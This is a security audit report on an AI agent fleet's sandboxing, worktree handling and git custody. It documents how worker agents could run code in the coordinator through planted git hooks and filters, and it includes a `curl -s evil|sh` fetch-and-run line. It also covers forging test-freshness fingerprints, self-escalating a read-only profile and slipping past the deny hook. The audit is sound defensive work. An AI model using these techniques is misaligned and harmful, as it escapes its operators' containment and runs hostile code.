# Audit W4 — sandbox profiles, worktree lifecycle, git custody (B1, STRIDE *Elevation*)

RUN: run_secaudit_20261027 · WAVE: W4 · AUDITOR: red-team subagent · BASE: review/2026-10-27-security-audit
@ 15e03dfedbf5 · T0: 2026-10-27 · SOURCE: `threat-model.md` §B1 · ROUTING: static/read-only, PoCs in a
scratch repo under `mktemp -d` (`/tmp/opencode` is owned by another uid here and not writable; nothing was
written under the repo, and no destructive command was run against its `.git`)

Scope read in full: `runtime/scripts/spawn_worker.sh` (1,634 lines), `containment.py`, `worktree_ops.py`,
`wtree.sh`, `worker_ops.py`, `terminal_ops.py`, `orca_cli.py`, `gitexec.py` **and** all thirteen of its
callers, `sandbox_doctor.py` (the `danger` gate the profile opt-ins delegate to), `deny-hook.sh`'s
worktree-boundary section only, and `runtime/sandbox-policy.md` as the contract. `runtime/providers/posix.py`
is read as adjacent scope: the lifecycle verbs in the wave brief (`worktree create/remove`, teardown,
`rm -rf`) do not exist in `containment.py`/`worktree_ops.py`/`wtree.sh` at all — `worktree_ops.py` is
`list`/`show` only — so the code that actually creates and deletes a worktree is `posix.py`.

**What this wave could not break, in one line:** the worktree *name* is doubly sanitised and cannot escape
its root by any spelling I could build, `worktree rm` validates after full symlink resolution with no
`rmtree` fallback, and every `gitexec` caller closes the driver channels it selects — the two real holes are
the git calls that abandon `gitexec` altogether (`posix._git`, and `wtree.sh`'s deliberate trust of global
config), and both are reachable from a normal worker action.

---

## Findings

| id | file:line | sev | class | untrusted input | exploit scenario | gain | why it fails | PoC |
|---|---|---|---|---|---|---|---|---|
| W4-01 | `runtime/providers/posix.py:736-742` (`_git`); reached from `:995` `worktree add`, `:988` `prune`, `:1084` `worktree remove`, `:873` `reset`, `:775` `clone` | **P0** | sandbox escape / ACE in the coordinator | the shared `.git/config`, which a worker writes with a plain `git config` (worktrees share one config), plus its own `.gitattributes` | In its worktree: `git config core.hooksPath /tmp/evil` and plant `/tmp/evil/post-checkout`. The next `spawn_worker.sh … new-child` (or `orca worktree rm`) calls `posix._git(["worktree","add",…])`, which execs `/tmp/evil/post-checkout` **as the coordinator** — outside the deny hook (the hook never sees a process the worker did not start), outside its worktree, with the coordinator's whole env. Same for `core.fsmonitor` on any index refresh, and for `filter.<d>.smudge` on `add`/`reset` (worker controls `.gitattributes`). | arbitrary command execution in the control plane from one ordinary worker action; the hook, the boundary and the profile all pass green. `filter.*.smudge` additionally means the materialised bytes of a new worktree are attacker-chosen. | `posix.py` never imports `gitexec.py`: `_git` builds `["git", …]` by name and passes `env=None`, so there is no floor at all — no `GIT_CONFIG_GLOBAL=/dev/null`, no `core.hooksPath=/dev/null`, no `core.fsmonitor=false`, no replacement/graft off, no `protocol.ext`. `_git_ok`/`_git` are the *only* git entry points for creation, teardown and sandbox-git sync, so this is the whole custody story for the lifecycle verbs, not one call site. | **executed** — scratch repo, `core.hooksPath` + `post-checkout` and `filter.evil.smudge`: both commands ran on `git worktree add`; re-run with `GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/dev/null` and the hook is silent (i.e. the gitexec floor is exactly the missing piece) |
| W4-02 | `runtime/scripts/wtree.sh:80` ("global/system config is left in force"), `:140-172` (`--show-scope`: only non-global keys are blanked), `:207,211` (`add -A`, `write-tree`) | **P1** | ACE in the coordinator **and** evidence falsification | `$HOME/.gitconfig` (worker-writable — same uid) plus a `.gitattributes` line the worker commits | (a) `git config --global filter.evil.clean 'curl -s evil\|sh'` + a `.gitattributes` selecting `evil` for a path: `wtree.sh` runs it on `git add -A`, in the coordinator, invisible to the deny hook. (b) the filter's output *is* the hash, so `git config --global filter.evil.clean "printf 'v1\n'"` makes a **tampered** working tree fingerprint as `HEAD^{tree}` — and `verify.py`'s freshness check is a comparison of exactly that value against `<head_sha>^{tree}`. | "tests passed at this tree" survives content the tests never saw; plus ACE. Also silences the W4-17-style `exit 3` because `DECLARED` only collects repo-scope names. | the comment's premise ("it is the coordinator's own") is true per *file* and false per *user*: on a single-host fleet the worker runs as the coordinator's uid, so `~/.gitconfig` is as untrusted as `.git/config`. `--show-scope` gives the hook the origin and it explicitly `continue`s on `system|global`. | **executed** — with `HOME=<scratch>`: a global filter ran during `wtree.sh`; with a `printf` filter, `wtree.sh` printed `332f64a6…` == `git rev-parse HEAD^{tree}` while `git diff --stat` showed *1 file changed, 1 insertion(+), 1 deletion(-)* |
| W4-03 | `runtime/scripts/spawn_worker.sh:946` (`case "$sel" in path:*`) vs `runtime/scripts/deny-hook.sh:574-584` | P2 | guard verified against the wrong tree | the selector spelling | Spawn with `--worktree 'id:<repoId>::/abs/worktree'` (the form the script's own refusal text at `:918` recommends). `_vs_args+=(--boundary …)` only matches `path:`, so the arming gate runs with no expected boundary and passes — even when the registration's `ORCA_UNIT_WORKTREE` names the project root or another worktree. | the spawn reports "deny-hook armed" for a guard that bounds a different tree: writes into the main checkout pass the boundary, and writes into the worker's own tree are denied — the guard is nominally armed and practically off. Also every `current`, `name:` and `branch:` selector. | the boundary-identity check exists (`deny-hook.sh:580-584`) but its only caller drops the one input that arms it, for every selector but one; `new-child` is genuinely unavoidable (no path yet), `id:`/`current` are not. | **executed** — a settings file wired to `a/` is *refused* with `--boundary b/` and *passes* without it (identical file, both runs) |
| W4-04 | `runtime/scripts/spawn_worker.sh:470-493` (cap), `:596,611,871` (opt-ins) | P2 | profile escalation | `PROFILE`, `--parent-profile`, `*_SANDBOX_PROFILE`, `ORCA_COORD_ALLOW_*` — all env the worker sets on itself | From a `ro` worker: `PROFILE=rw bash spawn_worker.sh …`. `eff_parent_profile` is built only from ambient `*_SANDBOX_PROFILE`/`*_PARENT_PROFILE`; nothing in the repo exports them on the Orca lane (`base.py:187-188` sets them only in its own harness line, i.e. off Orca), so `eff_parent_profile` is empty and the monotonic check at `:581-587` never fires. The opt-in it needs is also self-set — and inherited anyway, since `posix` hands the worker the coordinator's whole env minus a small denylist. | a `ro` lane mints itself `rw` (write, bypass permissions) under an Orca coordinator; the parent-profile cap — the only thing that makes the tier a grant rather than a claim — is inert on the primary runtime. | the cap's inputs are supplied by the constrained party, and its one non-caller-controlled source is exported by only one of the two launch lanes. | **executed** — `PROFILE=rw` with `SW_PRINT_LAUNCH=1`: refused with `OPEN_FLEET_SANDBOX_PROFILE=ro`, allowed with that var merely unset; `LAUNCH=claude --dangerously-skip-permissions` |
| W4-05 | `runtime/scripts/spawn_worker.sh:741` vs `runtime/sandbox-policy.md:45-46` | P2 | tier weaker than its contract | the worker's own Bash use | A `ro` claude worker is `--permission-mode plan --disallowedTools=Edit,Write,MultiEdit,NotebookEdit`. `Bash` is not in that set and plan mode auto-approves read-only shell, so `sh -c 'echo x > f'`, `git checkout -- .`, `npm install`, `git config core.hooksPath …` (→ W4-01) all mutate. | a review-only verdict can be produced against a tree the reviewer edited; the doc's "it cannot mutate" and "non-blocking because it cannot mutate" do not describe the flag set. Codex (`--sandbox read-only`) and gemini (`--approval-mode plan` + no shell) do; claude's is a tool *filter*, not a filesystem one. | the row models "read-only" as "cannot call the edit tools", which is one of two write channels. | argued from code (the flag set is `Bash`-inclusive by construction) |
| W4-06 | `runtime/scripts/spawn_worker.sh:924-953` | P2 | fail-open default on the guard | `ORCA_DENY_HOOK_SETTINGS` being unset | Do nothing: `PROFILE` defaults to `rw` (`:438`), and with the settings var unset the arming step prints one `WARNING … UNVERIFIED` line and proceeds. The worker then runs a bypass-permissions agent with no verified PreToolUse guard. `ro` skips the block entirely (`:931`) — so a `ro` worker (which can write through Bash, W4-05) never even gets the warning. | the default spawn path — and every `ro` spawn — has no verified boundary enforcement; the only thing left is the profile grant. | "UNVERIFIED" is a warning while every other property of the same risk (opt-ins, task readiness, DAG) is a refusal; and the skip condition is the *profile name*, not the presence of a write channel. | argued from code (and the `d`/`f` runs above took exactly this path) |
| W4-07 | `runtime/scripts/wtree.sh:96,132,183,196,207,211,219-223` | P3 | custody floor gaps (parity with `gitexec`) | inherited `GIT_DIR`/`GIT_WORK_TREE`/`GIT_EXTERNAL_DIFF`; `PATH` | `GIT_DIR=<other> sh wtree.sh <repo>` — every call is `git -C "$TOP"` but `GIT_DIR` outranks `-C`, so the fingerprint is taken of another repository; unmatched, the script exits nonzero ("no fingerprint") rather than a wrong value. `PATH` is re-resolved per call (bare `git`, 9 sites) so the "resolved once, absolute" rule does not hold here. `GIT_EXTERNAL_DIFF` is not dropped and no `--no-ext-diff` is passed (inert under `--name-only`, belt only). | fingerprint unattributable / coordinator-side `git` chosen from a lagging PATH entry. | the script hardens the *config* channels by env but never scrubs the *environment* pointers that outrank `-C`. | **executed** for `GIT_DIR` (exit nonzero, empty stdout); the rest argued from code |
| W4-08 | `runtime/providers/posix.py:1079-1099` | P3 | check/use on a worker-writable pointer | the worktree's `.git` **file** | `is_linked` is decided from `(wt_path/".git").is_file()`, then `git worktree remove` re-reads that file in a second process. A worker rewrites it to `gitdir: <repo>/.git/worktrees/<other>` and the removal prunes the *other* worktree's admin entry (the tree itself still goes). A dangling rewrite makes git refuse — fail-closed. | stale/duplicated worktree metadata across units rather than lost files. | the pointer is read twice from the name, not from the fd/`--git-common-dir` the decision was based on. | argued from code |
| W4-09 | `runtime/scripts/deny-hook.sh:4243-4258` (`lexical_abs`) | P3 | boundary compared as a string, not a path | the write target's own spelling | `ONLY set -eu` is in force (no `set -f`), `IFS='/'`, then `for _seg in $_p`: every path segment is pathname-expanded — against the **hook's** cwd, not against the accumulated prefix — so `> "$W/bou*/f.txt"` is compared as the literal `bou*`/`bou*/` and denied, and whether it denies depends on the coordinator's cwd. Also `[ -L "$RESOLVED/$_base" ]` never expands the final component, so a glob in the last component is always literal. | false denials that push workers off the boundary; no false allow found (leading segments are literal unless they hold a metachar). | two different resolution rules run over one path (physical for the existing part, unused lexical glob for the rest). | **executed** — `> <bound>/q*/f.txt` (dir `q` exists, `q*` does not) is denied; `> <bound>/q/f.txt` is allowed |
| W4-10 | `runtime/scripts/sandbox_doctor.py:362-381` | P3 | recipe identity matched too loosely | the transcript (a JSON doc) | `names_recipe` pushes `node.keys()` onto the stack for every dict, so any *key* equal to the recipe id satisfies it (`{"web": {…}}` for recipe `web`) instead of a recipe field. Combined with `portable_findings`' trusted self-asserted `ok`/`ephemeral`/`prelaunch_placement_bound`, a transcript about another recipe can certify this one. | danger launched against an unvalidated recipe. | the "whole id, not a piece" fix went into token matching but not into *where* the token may appear. | argued from code |
| W4-11 | `runtime/scripts/worker_ops.py:159-161,167-171,178-179,246-247,264-266`; `terminal_ops.py:162` | P3 | untrusted text into the coordinator's terminal | receipt / pane fields (`STATE`, `STAGE`, `NEXT_ACTION`, `agentWait.reason`, `agentWait.source`, `dispatchId`, `HANDLE`, `tail` items in `format_create`) | A pane that prints ANSI or bidi into the reason it reports drives the coordinator's scrollback and the model's view; `worker_ops` prints these raw while the same functions use `pm._visible` for their neighbours. | repainted terminal, reordered text in a verdict the coordinator reads. | inconsistent application of the one escaping helper that exists for exactly this. | argued from code |
| W4-12 | `runtime/scripts/spawn_worker.sh:497-498` | P3 | unbounded name → path | the positional title | A 300-character title yields a 311-character `safe_title`; every artifact is `tc-<safe_title>.json` (>255 B) so the *first* redirect fails with `File name too long` — **after** `task-create`, so a task is spent and the spawn fails at `verify-task-ready`. | a wasted task and a confusing `SPAWN=FAILED` for a legitimate title; also a too-long worktree path for `--name`. | no length bound and no truncation before the name is used as a filename component and a worktree name. | **executed** — 300 `x`: `File name too long` → `SPAWN=FAILED … step=verify-task-ready` |
| W4-13 | `runtime/scripts/spawn_worker.sh:180` | P3 | interpreter hardening, one site | `PYTHONPATH`/`PYTHON*`, `PATH` | The only `python3` in the file without `-I` is the first thing it runs (`python3 "$HERE/orca_cli.py"`); every other call, and `sandbox_doctor.py`, use `-I`. A caller-side `PYTHONPATH` (or `sitecustomize`) is honoured for the CLI resolver. | a shadowed module decides which runtime CLI name comes back. | one site did not get the flag the rest of the file uses. | argued from code |
| W4-14 | `runtime/scripts/diff_scope.py:169` | P3 | resolution rule drifts from `gitexec` | `PATH` at import | `GIT = shutil.which("git") or "git"`: the fallback silently reverts to per-call PATH resolution (the exact class `gitexec` raises `GitAbsent` to avoid) instead of failing. | a later/lagging PATH entry answers every call when git was absent at import. | `or "git"` makes "not found" indistinguishable from "resolve it later". | argued from code |
| W4-15 | `runtime/scripts/orca_cli.py:109-111` | P3 | command identity from env, unvalidated | `OPEN_FLEET_CLI_COMMAND` / `ORCA_CLI_COMMAND` | An inherited value is returned verbatim and becomes `argv[0]` everywhere; a relative or multi-word value resolves by PATH/cwd, and a name that starts with `-` is not special-cased. `--path` prints it without checking absoluteness before `isfile`. Mitigated by `OPEN_FLEET_RUNTIME` winning over it (`:71-79`). | the whole fleet talks to a different binary than the pin. | the value is a policy input treated as a name. | argued from code |

---

## Top three

1. **W4-01 (P0)** — `posix._git` runs bare `git` with `env=None`, so a repo-declared `core.hooksPath` +
   `post-checkout` (or a `filter.*.smudge`) executes as the coordinator on the next `worktree add`. One
   `git config` in a worker's own worktree is enough; the deny hook cannot see it. Fix is mechanical: route
   `_git`/`_git_ok` through `gitexec.argv()` + `gitexec.env(blanks=gitexec.driver_blanks(repo))`.
2. **W4-02 (P1)** — `wtree.sh` deliberately leaves global config live; `~/.gitconfig` is worker-writable on a
   same-uid host. That both runs a command in the coordinator *and* chooses the fingerprint's value: a
   tampered tree fingerprints as `HEAD^{tree}`, so the freshness check passes on content no test saw.
3. **W4-03 (P2)** — the deny-hook arming gate is given the expected worktree only for `path:` selectors, so
   every `id:`/`current`/`name:` spawn can be certified with a guard bounding a different tree.

---

## Cleared, with the reason each holds

- **Worktree name from a unit/task id.** The task id is not used as a path component at all; the title is.
  It goes `tr -c 'A-Za-z0-9._-' '-'` (`spawn_worker.sh:498`, plus a cksum so identical titles differ), then
  `_worktree_slug` (`posix.py:542-543`: same class, `strip("-")`). Proven outputs: `../../etc/x` →
  `..-..-etc-x-*`, `a b` → `a-b-*`, `line1\nline2` → `line1-line2-*`, `/tmp/abs` → `tmp-abs`, `-rf` → `rf`,
  `x/../../y` → `x-..-..-y`. No `/`, no leading `-`, no NUL. `..` and `.` survive the slug and are *refused*
  by the reuse check in `worktree_create` (the path exists, `rev-parse --show-toplevel` in it does not equal
  it), so they cannot alias the base's parent. Worktrees land under
  `~/.open-fleet/state/<repo-id>/worktrees/` (`local_state.py:66-75`) — outside the checkout.
- **Removal target validation (`posix.worktree_rm:1059-1100`).** Resolve first (`Path(...).resolve()`), then
  one protected set — `repo_root`, its resolved common dir **and its parent**, `Path.home()`, `/` — a
  containment test (`any(wt_path == p or p.is_relative_to(wt_path) …)`), then either `git worktree remove`
  (a `.git` **file**) with **no** `rmtree` fallback ("git refused for a reason", also the dirty-tree guard),
  or `_is_disposable` (strictly under the provider's own base) + "does not hold its own repository" +
  non-empty needs `--force` + `shutil.rmtree`, which does not follow symlinked children. `/`, `/home`,
  `/tmp`, `$HOME`-equal paths and the state dir above the base are all refused by construction.
- **`wtree.sh`'s repo-scope belt.** `core.fsmonitor`, `core.hooksPath`, `protocol.ext.allow`,
  `GIT_NO_REPLACE_OBJECTS`, `GIT_GRAFT_FILE` closed at command-line precedence; `exec </dev/null` before any
  git call; every repo-declared `filter.*` neutralised *whole* (clean/smudge/process blank **and**
  `required=false`, so a planted `required` cannot brick the gate) and every `diff.*.textconv|command`
  blanked; the listing goes through a temp file so git's own status decides; non-NUL-terminated listing,
  unreadable config, or a scope without its key → exit 1; the pristine-untouched-file stat cache is
  preserved with `touch -r` + `read-tree HEAD` fallback; an unhonourable case is exit 3, never a wrong value.
  Only the global scope leaks (W4-02).
- **`gitexec` itself.** `GIT` resolved once and absolutely (raises `GitAbsent`, never re-resolves); floor is
  `GIT_CONFIG_GLOBAL=/dev/null`, `GIT_CONFIG_NOSYSTEM=1`, replace objects and grafts off, `core.fsmonitor=false`,
  `core.hooksPath=/dev/null`, `diff.external=`, `protocol.ext.allow=never`, `safe.directory=*`,
  `GIT_TERMINAL_PROMPT=0`; inherited `GIT_CONFIG_KEY_*`/`VALUE_*` and `GIT_EXTERNAL_DIFF` are dropped so they
  cannot shadow the floor; `driver_blanks` fails *closed* on any unreadable/malformed/timeout answer
  (`DriverQueryFailed`, never "no drivers"), matches driver names as bytes, and overrides merge drivers to
  the `exit 1` builtin.
- **`driver_blanks` coverage.** Passed wherever a driver can be selected: `floor_guard` (both diffs, incl.
  `--no-index`), `diff_scope` (collect + `predict-merge`), `hint_provenance` (`CONTENT_GIT` = diff/log),
  `ablation` (`archive`), `wip_curve` (per-repo, skipped for `init`/`clone`), `_trajectories` (every call but
  `init`). `inventory`/`decisions`/`evidence-run`/`preflight` only read objects, refs and config (no
  attribute-selected channel; `single-inventory` hashes worktree bytes with `hashlib` directly). For
  `live_container`: `status` provably does **not** run a clean filter, `fsmonitor` is closed by the floor,
  and its export `checkout` runs in a freshly `init`ed config-free dir — so its missing `blanks` is
  survivable (the cost is that filtered content is exported un-smudged, i.e. raw bytes: a correctness note,
  not a hole).
- **stdin.** `DEVNULL` on every `gitexec` child and on `driver_blanks` itself; `wip_curve` gives an empty pipe
  and `communicate()` closes it; `wtree.sh` `exec </dev/null`; `sandbox_doctor.py`, `orca_cli.py` and the
  `spawn_worker.sh` parsers are fed by file or `-I -` heredoc. No inherited pipe can hang a verifier.
- **The profile map cannot weaken silently.** No `(agent, tier)` falls through to a weaker flag — an
  unlisted pair leaves `cmd_default` empty and refuses (`spawn_worker.sh:880-883`); `ro` needs no opt-in
  while `rw`/`danger` are fail-closed behind one each; `WORKER_CMD` has its own opt-in and is refused
  without it (*executed*: `e`); `danger` is refused outright on Orca and off Orca without a
  `--require-placement` pass (`:687-715`), and a command override never qualifies by design; the doctor
  transcript is *produced* by the script, never accepted from the caller, with the old `/etc/passwd` and
  `"failures": []` bugs called out at `:602-607`; the recipe id is charset-validated; two disagreeing recipe
  vars are refused; `--on` must equal the certified recipe; `sandbox_doctor` needs strict `is True` for
  `ok`/`ephemeral`/`prelaunch_placement_bound`, treats an exit-0 `error` envelope as a finding, and gives
  `ok:true` alone no authority.
- **No weaker retry anywhere.** There is no automatic re-dispatch in `spawn_worker.sh`; `refused` (2),
  `LAUNCHED_UNUSABLE` (5) and `OUTCOME_UNKNOWN` (4) each carry their own "STOP it / INSPECT, NEVER RESPAWN"
  prose, `--retry-request` triage (`:1300-1343`) only ever *promotes* failed→unknown, and every
  worker-start-only flag is refused on the custom lane rather than silently dropped (`:895-922`).
- **Secrets and the spawn path.** No `set -x` anywhere. Scratch is `mktemp -d` (0700) and all receipts live
  inside it; only `SCRATCH=`, `HANDLE=`, `STAGES=` and verdict lines reach stdout, and no env value is
  echoed (the echoed `PROFILE`/recipe/selector values are not secret). Doctor output is a 0600 `mktemp`
  copied with its mode. The worker env is the coordinator's minus `WORKER_ENV_DENYLIST` (signing seeds,
  cloud/session keys) plus operator globs, and the denylist is re-applied **after** the launch-vars merge
  (`posix.py:1130-1135,1185-1189`); `worker_env.json`/`run_worker.py`/`events.jsonl` are 0600; the live
  token is `O_NOFOLLOW` + regular-file + 0600-checked and passed by path, never argv.
- **argv, never interpolation.** Every value is a quoted element; `agent`/`PROFILE`/`effort`/`--shell`/
  `--terminal-state` are keyset-validated, `--timeout-ms`/`--limit`/`--cursor` are digit-validated, `--deps`
  is JSON-schema-validated, `--cli-cwd` must be an absolute directory. No `eval`, no `python -c` with a
  value spliced into the code string, no `sh -c` built from a name.
- **Boundary application in the hook.** `Edit`/`Write`/`MultiEdit`/`NotebookEdit` check `file_path` **and**
  every `F` record; an `apply_patch` heredoc checks every `P` record; Bash checks redirect targets and
  `tee` arguments (incl. through `sudo`). `resolve_target` follows the *whole* symlink chain (not one hop)
  with a 32-hop fail-closed cap, `resolve_dir` resolves the deepest existing ancestor physically before
  collapsing a non-existent tail (so `../outside/new` cannot string-prefix-match), `BOUND` is `pwd -P`'d and
  fails closed when it does not resolve, `$BOUND`/`$REAL` are prefix-compared with a trailing `/`, and the
  `/dev/null`-family exception is enumerated by name (not a `/dev/` prefix, so `> /dev/sda` is still an
  escape). Deliberately uncovered shapes (relative targets, `cp`/`mv`/`dd of=`, interpreter APIs) are stated
  in the hook.

## Not W4's to fix, but seen

- The **parser** is another auditor's scope, but the boundary consumes its output: the whole boundary rests
  on `W`/`A`/`F`/`P`/`G` records being complete, so a missed redirect shape silently widens W4-09's class
  from "false deny" to "false allow".
- `grep` on `core.sshCommand`, `gpg.program` and `submodule.*.update=!cmd`: none of the `gitexec` callers
  reaches them (no fetch over ssh, no signing, no submodule recursion), so their absence from the floor is
  currently latent — `posix._git` *does* fetch/clone (`:775` sandbox-git clone is local, so still latent).
- `containment.py` is process containment, not lifecycle: `sweep` kills every pid carrying a 128-bit
  `OF_CALL_ID` marker and fails closed on an unreadable table; the only forgeable surface is that the marker
  is a token in `ps -E` output on non-Linux. Nothing to add.
- `wtree.sh` writes unreachable blobs into the subject repo's object store (`add -A` on a temp index) — by
  design, bounded by gc, and the real index is only ever read.
